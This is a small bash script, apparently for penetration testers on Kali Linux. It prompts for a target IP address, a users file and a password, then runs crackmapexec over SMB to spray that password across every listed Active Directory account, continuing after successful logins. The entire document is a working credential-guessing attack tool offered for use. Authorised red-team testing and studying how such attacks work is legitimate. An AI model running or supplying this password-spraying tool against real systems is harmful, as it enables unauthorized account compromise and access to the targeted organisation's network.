#!/bin/bash 

# This is a script which asks for parameters to do password spraying with crackmapexec so you don't need to remember the syntax!
# Save this to /usr/local/bin on your Kali Linux machine and then you can just type ad_passwordspray.sh to launch it

echo "Enter the IP Address of your target:"
read ip_address

echo "Enter the location of your users.txt file" 
read users_file

echo "Enter the password you want to spray at the users"
read password

crackmapexec smb $ip_address -u $users_file -p $password --continue-on-success
